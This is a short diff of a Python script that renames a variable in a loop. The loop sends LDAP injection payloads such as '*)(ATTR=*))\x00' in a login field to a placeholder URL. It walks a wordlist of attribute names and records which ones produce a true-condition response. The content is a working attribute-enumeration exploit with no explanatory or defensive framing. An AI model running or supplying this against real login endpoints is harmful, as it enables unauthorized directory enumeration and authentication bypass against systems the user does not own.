@@ -122,10 +122,10 @@ fields = []
 url = 'https://URL.com/'
 
 f = open('dic', 'r') #Open the wordlists of common attributes
-wordl = f.read().split('\n')
+world = f.read().split('\n')
 f.close()
 
-for i in wordl:
+for i in world:
     r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
     if 'TRUE CONDITION' in r.text:
         fields.append(str(i))
